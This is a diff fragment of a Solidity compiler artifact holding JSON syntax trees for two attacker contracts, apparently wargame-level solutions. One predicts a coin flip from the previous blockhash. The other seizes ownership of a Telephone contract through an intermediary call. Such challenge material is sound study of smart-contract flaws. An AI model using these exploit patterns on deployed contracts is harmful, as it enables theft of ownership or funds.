+                        "src": "341:20:0"
+                      }
+                    ]
+                  },
+                  "id": 26,
+                  "implemented": true,
+                  "kind": "constructor",
+                  "modifiers": [],
+                  "name": "",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 19,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 18,
+                        "mutability": "mutable",
+                        "name": "_CoinFlip",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 26,
+                        "src": "312:17:0",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        "typeName": {
+                          "id": 17,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "312:7:0",
+                          "stateMutability": "nonpayable",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "311:19:0"
+                  },
+                  "returnParameters": {
+                    "id": 20,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "331:0:0"
+                  },
+                  "scope": 77,
+                  "src": "300:68:0",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "public"
+                },
+                {
+                  "body": {
+                    "id": 75,
+                    "nodeType": "Block",
+                    "src": "399:379:0",
+                    "statements": [
+                      {
+                        "assignments": [
+                          30
+                        ],
+                        "declarations": [
+                          {
+                            "constant": false,
+                            "id": 30,
+                            "mutability": "mutable",
+                            "name": "blockValue",
+                            "nodeType": "VariableDeclaration",
+                            "scope": 75,
+                            "src": "465:18:0",
+                            "stateVariable": false,
+                            "storageLocation": "default",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            },
+                            "typeName": {
+                              "id": 29,
+                              "name": "uint256",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "465:7:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_uint256",
+                                "typeString": "uint256"
+                              }
+                            },
+                            "visibility": "internal"
+                          }
+                        ],
+                        "id": 40,
+                        "initialValue": {
+                          "arguments": [
+                            {
+                              "arguments": [
+                                {
+                                  "commonType": {
+                                    "typeIdentifier": "t_uint256",
+                                    "typeString": "uint256"
+                                  },
+                                  "id": 37,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "leftExpression": {
+                                    "expression": {
+                                      "id": 34,
+                                      "name": "block",
+                                      "nodeType": "Identifier",
+                                      "overloadedDeclarations": [],
+                                      "referencedDeclaration": -4,
+                                      "src": "504:5:0",
+                                      "typeDescriptions": {
+                                        "typeIdentifier": "t_magic_block",
+                                        "typeString": "block"
+                                      }
+                                    },
+                                    "id": 35,
+                                    "isConstant": false,
+                                    "isLValue": false,
+                                    "isPure": false,
+                                    "lValueRequested": false,
+                                    "memberName": "number",
+                                    "nodeType": "MemberAccess",
+                                    "src": "504:12:0",
+                                    "typeDescriptions": {
+                                      "typeIdentifier": "t_uint256",
+                                      "typeString": "uint256"
+                                    }
+                                  },
+                                  "nodeType": "BinaryOperation",
+                                  "operator": "-",
+                                  "rightExpression": {
+                                    "hexValue": "31",
+                                    "id": 36,
+                                    "isConstant": false,
+                                    "isLValue": false,
+                                    "isPure": true,
+                                    "kind": "number",
+                                    "lValueRequested": false,
+                                    "nodeType": "Literal",
+                                    "src": "519:1:0",
+                                    "typeDescriptions": {
+                                      "typeIdentifier": "t_rational_1_by_1",
+                                      "typeString": "int_const 1"
+                                    },
+                                    "value": "1"
+                                  },
+                                  "src": "504:16:0",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_uint256",
+                                    "typeString": "uint256"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_uint256",
+                                    "typeString": "uint256"
+                                  }
+                                ],
+                                "id": 33,
+                                "name": "blockhash",
+                                "nodeType": "Identifier",
+                                "overloadedDeclarations": [],
+                                "referencedDeclaration": -5,
+                                "src": "494:9:0",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
+                                  "typeString": "function (uint256) view returns (bytes32)"
+                                }
+                              },
+                              "id": 38,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "functionCall",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "494:27:0",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_bytes32",
+                                "typeString": "bytes32"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_bytes32",
+                                "typeString": "bytes32"
+                              }
+                            ],
+                            "id": 32,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "lValueRequested": false,
+                            "nodeType": "ElementaryTypeNameExpression",
+                            "src": "486:7:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_type$_t_uint256_$",
+                              "typeString": "type(uint256)"
+                            },
+                            "typeName": {
+                              "id": 31,
+                              "name": "uint256",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "486:7:0",
+                              "typeDescriptions": {}
+                            }
+                          },
+                          "id": 39,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "typeConversion",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "486:36:0",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        },
+                        "nodeType": "VariableDeclarationStatement",
+                        "src": "465:57:0"
+                      },
+                      {
+                        "condition": {
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "id": 43,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftExpression": {
+                            "id": 41,
+                            "name": "lastHash",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 14,
+                            "src": "536:8:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "nodeType": "BinaryOperation",
+                          "operator": "==",
+                          "rightExpression": {
+                            "id": 42,
+                            "name": "blockValue",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 30,
+                            "src": "548:10:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "src": "536:22:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_bool",
+                            "typeString": "bool"
+                          }
+                        },
+                        "id": 48,
+                        "nodeType": "IfStatement",
+                        "src": "532:61:0",
+                        "trueBody": {
+                          "id": 47,
+                          "nodeType": "Block",
+                          "src": "560:33:0",
+                          "statements": [
+                            {
+                              "expression": {
+                                "arguments": [],
+                                "expression": {
+                                  "argumentTypes": [],
+                                  "id": 44,
+                                  "name": "revert",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [
+                                    -19,
+                                    -19
+                                  ],
+                                  "referencedDeclaration": -19,
+                                  "src": "574:6:0",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_function_revert_pure$__$returns$__$",
+                                    "typeString": "function () pure"
+                                  }
+                                },
+                                "id": 45,
+                                "isConstant": false,
+                                "isLValue": false,
+                                "isPure": false,
+                                "kind": "functionCall",
+                                "lValueRequested": false,
+                                "names": [],
+                                "nodeType": "FunctionCall",
+                                "src": "574:8:0",
+                                "tryCall": false,
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_tuple$__$",
+                                  "typeString": "tuple()"
+                                }
+                              },
+                              "id": 46,
+                              "nodeType": "ExpressionStatement",
+                              "src": "574:8:0"
+                            }
+                          ]
+                        }
+                      },
+                      {
+                        "expression": {
+                          "id": 51,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftHandSide": {
+                            "id": 49,
+                            "name": "lastHash",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 14,
+                            "src": "603:8:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "nodeType": "Assignment",
+                          "operator": "=",
+                          "rightHandSide": {
+                            "id": 50,
+                            "name": "blockValue",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 30,
+                            "src": "614:10:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "src": "603:21:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        },
+                        "id": 52,
+                        "nodeType": "ExpressionStatement",
+                        "src": "603:21:0"
+                      },
+                      {
+                        "assignments": [
+                          54
+                        ],
+                        "declarations": [
+                          {
+                            "constant": false,
+                            "id": 54,
+                            "mutability": "mutable",
+                            "name": "coinFlip",
+                            "nodeType": "VariableDeclaration",
+                            "scope": 75,
+                            "src": "634:16:0",
+                            "stateVariable": false,
+                            "storageLocation": "default",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            },
+                            "typeName": {
+                              "id": 53,
+                              "name": "uint256",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "634:7:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_uint256",
+                                "typeString": "uint256"
+                              }
+                            },
+                            "visibility": "internal"
+                          }
+                        ],
+                        "id": 58,
+                        "initialValue": {
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "id": 57,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftExpression": {
+                            "id": 55,
+                            "name": "blockValue",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 30,
+                            "src": "653:10:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "nodeType": "BinaryOperation",
+                          "operator": "/",
+                          "rightExpression": {
+                            "id": 56,
+                            "name": "FACTOR",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 12,
+                            "src": "666:6:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "src": "653:19:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        },
+                        "nodeType": "VariableDeclarationStatement",
+                        "src": "634:38:0"
+                      },
+                      {
+                        "assignments": [
+                          60
+                        ],
+                        "declarations": [
+                          {
+                            "constant": false,
+                            "id": 60,
+                            "mutability": "mutable",
+                            "name": "side",
+                            "nodeType": "VariableDeclaration",
+                            "scope": 75,
+                            "src": "682:9:0",
+                            "stateVariable": false,
+                            "storageLocation": "default",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_bool",
+                              "typeString": "bool"
+                            },
+                            "typeName": {
+                              "id": 59,
+                              "name": "bool",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "682:4:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_bool",
+                                "typeString": "bool"
+                              }
+                            },
+                            "visibility": "internal"
+                          }
+                        ],
+                        "id": 67,
+                        "initialValue": {
+                          "condition": {
+                            "commonType": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            },
+                            "id": 63,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "leftExpression": {
+                              "id": 61,
+                              "name": "coinFlip",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 54,
+                              "src": "694:8:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_uint256",
+                                "typeString": "uint256"
+                              }
+                            },
+                            "nodeType": "BinaryOperation",
+                            "operator": "==",
+                            "rightExpression": {
+                              "hexValue": "31",
+                              "id": 62,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "kind": "number",
+                              "lValueRequested": false,
+                              "nodeType": "Literal",
+                              "src": "706:1:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_rational_1_by_1",
+                                "typeString": "int_const 1"
+                              },
+                              "value": "1"
+                            },
+                            "src": "694:13:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_bool",
+                              "typeString": "bool"
+                            }
+                          },
+                          "falseExpression": {
+                            "hexValue": "66616c7365",
+                            "id": 65,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "kind": "bool",
+                            "lValueRequested": false,
+                            "nodeType": "Literal",
+                            "src": "717:5:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_bool",
+                              "typeString": "bool"
+                            },
+                            "value": "false"
+                          },
+                          "id": 66,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "nodeType": "Conditional",
+                          "src": "694:28:0",
+                          "trueExpression": {
+                            "hexValue": "74727565",
+                            "id": 64,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "kind": "bool",
+                            "lValueRequested": false,
+                            "nodeType": "Literal",
+                            "src": "710:4:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_bool",
+                              "typeString": "bool"
+                            },
+                            "value": "true"
+                          },
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_bool",
+                            "typeString": "bool"
+                          }
+                        },
+                        "nodeType": "VariableDeclarationStatement",
+                        "src": "682:40:0"
+                      },
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "id": 72,
+                              "name": "side",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 60,
+                              "src": "766:4:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_bool",
+                                "typeString": "bool"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_bool",
+                                "typeString": "bool"
+                              }
+                            ],
+                            "expression": {
+                              "arguments": [
+                                {
+                                  "id": 69,
+                                  "name": "CoinFlip",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": 16,
+                                  "src": "751:8:0",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                ],
+                                "id": 68,
+                                "name": "ICoinFlipChallenge",
+                                "nodeType": "Identifier",
+                                "overloadedDeclarations": [],
+                                "referencedDeclaration": 9,
+                                "src": "732:18:0",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_contract$_ICoinFlipChallenge_$9_$",
+                                  "typeString": "type(contract ICoinFlipChallenge)"
+                                }
+                              },
+                              "id": 70,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "732:28:0",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_ICoinFlipChallenge_$9",
+                                "typeString": "contract ICoinFlipChallenge"
+                              }
+                            },
+                            "id": 71,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "flip",
+                            "nodeType": "MemberAccess",
+                            "referencedDeclaration": 8,
+                            "src": "732:33:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
+                              "typeString": "function (bool) external returns (bool)"
+                            }
+                          },
+                          "id": 73,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "732:39:0",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_bool",
+                            "typeString": "bool"
+                          }
+                        },
+                        "id": 74,
+                        "nodeType": "ExpressionStatement",
+                        "src": "732:39:0"
+                      }
+                    ]
+                  },
+                  "functionSelector": "9e5faafc",
+                  "id": 76,
+                  "implemented": true,
+                  "kind": "function",
+                  "modifiers": [],
+                  "name": "attack",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 27,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "389:2:0"
+                  },
+                  "returnParameters": {
+                    "id": 28,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "399:0:0"
+                  },
+                  "scope": 77,
+                  "src": "374:404:0",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "public"
+                }
+              ],
+              "scope": 78,
+              "src": "115:665:0"
+            }
+          ],
+          "src": "0:781:0"
+        },
+        "id": 0
+      },
+      "contracts/4-TelephoneAttacker.sol": {
+        "ast": {
+          "absolutePath": "contracts/4-TelephoneAttacker.sol",
+          "exportedSymbols": {
+            "ITelephone": [
+              85
+            ],
+            "TelephoneAttacker": [
+              112
+            ]
+          },
+          "id": 113,
+          "nodeType": "SourceUnit",
+          "nodes": [
+            {
+              "id": 79,
+              "literals": [
+                "solidity",
+                "^",
+                "0.7",
+                ".3"
+              ],
+              "nodeType": "PragmaDirective",
+              "src": "0:23:1"
+            },
+            {
+              "abstract": false,
+              "baseContracts": [],
+              "contractDependencies": [],
+              "contractKind": "interface",
+              "fullyImplemented": false,
+              "id": 85,
+              "linearizedBaseContracts": [
+                85
+              ],
+              "name": "ITelephone",
+              "nodeType": "ContractDefinition",
+              "nodes": [
+                {
+                  "functionSelector": "a6f9dae1",
+                  "id": 84,
+                  "implemented": false,
+                  "kind": "function",
+                  "modifiers": [],
+                  "name": "changeOwner",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 82,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 81,
+                        "mutability": "mutable",
+                        "name": "_owner",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 84,
+                        "src": "73:14:1",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        "typeName": {
+                          "id": 80,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "73:7:1",
+                          "stateMutability": "nonpayable",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "72:16:1"
+                  },
+                  "returnParameters": {
+                    "id": 83,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "97:0:1"
+                  },
+                  "scope": 85,
+                  "src": "52:46:1",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "external"
+                }
+              ],
+              "scope": 113,
+              "src": "25:75:1"
+            },
+            {
+              "abstract": false,
+              "baseContracts": [],
+              "contractDependencies": [],
+              "contractKind": "contract",
+              "fullyImplemented": true,
+              "id": 112,
+              "linearizedBaseContracts": [
+                112
+              ],
+              "name": "TelephoneAttacker",
+              "nodeType": "ContractDefinition",
+              "nodes": [
+                {
+                  "constant": false,
+                  "id": 87,
+                  "mutability": "mutable",
+                  "name": "telephone",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 112,
+                  "src": "135:17:1",
+                  "stateVariable": true,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 86,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "135:7:1",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "body": {
+                    "id": 96,
+                    "nodeType": "Block",
+                    "src": "191:39:1",
+                    "statements": [
+                      {
+                        "expression": {
+                          "id": 94,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftHandSide": {
+                            "id": 92,
+                            "name": "telephone",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 87,
+                            "src": "201:9:1",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          },
+                          "nodeType": "Assignment",
+                          "operator": "=",
+                          "rightHandSide": {
+                            "id": 93,
+                            "name": "_telephone",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 89,
+                            "src": "213:10:1",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_address",
+                              "typeString": "address"
+                            }
+                          },
+                          "src": "201:22:1",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "id": 95,
+                        "nodeType": "ExpressionStatement",
+                        "src": "201:22:1"
+                      }
+                    ]
+                  },
+                  "id": 97,
+                  "implemented": true,
+                  "kind": "constructor",
+                  "modifiers": [],
+                  "name": "",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 90,
+                    "nodeType": "ParameterList",
+                    "parameters": [
+                      {
+                        "constant": false,
+                        "id": 89,
+                        "mutability": "mutable",
+                        "name": "_telephone",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 97,
+                        "src": "171:18:1",
+                        "stateVariable": false,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        "typeName": {
+                          "id": 88,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "171:7:1",
+                          "stateMutability": "nonpayable",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        },
+                        "visibility": "internal"
+                      }
+                    ],
+                    "src": "170:20:1"
+                  },
+                  "returnParameters": {
+                    "id": 91,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "191:0:1"
+                  },
+                  "scope": 112,
+                  "src": "159:71:1",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "public"
+                },
+                {
+                  "body": {
+                    "id": 110,
+                    "nodeType": "Block",
+                    "src": "261:65:1",
+                    "statements": [
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "arguments": [
+                                {
+                                  "id": 106,
+                                  "name": "this",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": -28,
+                                  "src": "313:4:1",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_contract$_TelephoneAttacker_$112",
+                                    "typeString": "contract TelephoneAttacker"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_contract$_TelephoneAttacker_$112",
+                                    "typeString": "contract TelephoneAttacker"
+                                  }
+                                ],
+                                "id": 105,
+                                "isConstant": false,
+                                "isLValue": false,
+                                "isPure": true,
+                                "lValueRequested": false,
+                                "nodeType": "ElementaryTypeNameExpression",
+                                "src": "305:7:1",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_address_$",
+                                  "typeString": "type(address)"
+                                },
+                                "typeName": {
+                                  "id": 104,
+                                  "name": "address",
+                                  "nodeType": "ElementaryTypeName",
+                                  "src": "305:7:1",
+                                  "typeDescriptions": {}
+                                }
+                              },
+                              "id": 107,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "305:13:1",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            ],
+                            "expression": {
+                              "arguments": [
+                                {
+                                  "id": 101,
+                                  "name": "telephone",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": 87,
+                                  "src": "282:9:1",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_address",
+                                    "typeString": "address"
+                                  }
+                                ],
+                                "id": 100,
+                                "name": "ITelephone",
+                                "nodeType": "Identifier",
+                                "overloadedDeclarations": [],
+                                "referencedDeclaration": 85,
+                                "src": "271:10:1",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_contract$_ITelephone_$85_$",
+                                  "typeString": "type(contract ITelephone)"
+                                }
+                              },
+                              "id": 102,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "271:21:1",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_ITelephone_$85",
+                                "typeString": "contract ITelephone"
+                              }
+                            },
+                            "id": 103,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "changeOwner",
+                            "nodeType": "MemberAccess",
+                            "referencedDeclaration": 84,
+                            "src": "271:33:1",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
+                              "typeString": "function (address) external"
+                            }
+                          },
+                          "id": 108,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "271:48:1",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_tuple$__$",
+                            "typeString": "tuple()"
+                          }
+                        },
+                        "id": 109,
+                        "nodeType": "ExpressionStatement",
+                        "src": "271:48:1"
+                      }
+                    ]
+                  },
+                  "functionSelector": "9e5faafc",
+                  "id": 111,
+                  "implemented": true,
+                  "kind": "function",
+                  "modifiers": [],
+                  "name": "attack",
+                  "nodeType": "FunctionDefinition",
+                  "parameters": {
+                    "id": 98,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "251:2:1"
+                  },
+                  "returnParameters": {
+                    "id": 99,
+                    "nodeType": "ParameterList",
+                    "parameters": [],
+                    "src": "261:0:1"
+                  },
+                  "scope": 112,
+                  "src": "236:90:1",
+                  "stateMutability": "nonpayable",
+                  "virtual": false,
+                  "visibility": "public"
+                }
+              ],
+              "scope": 113,
+              "src": "102:226:1"
+            }
+          ],
+          "src": "0:329:1"
+        },
+        "id": 1
+      }
+    }
+  }
+}
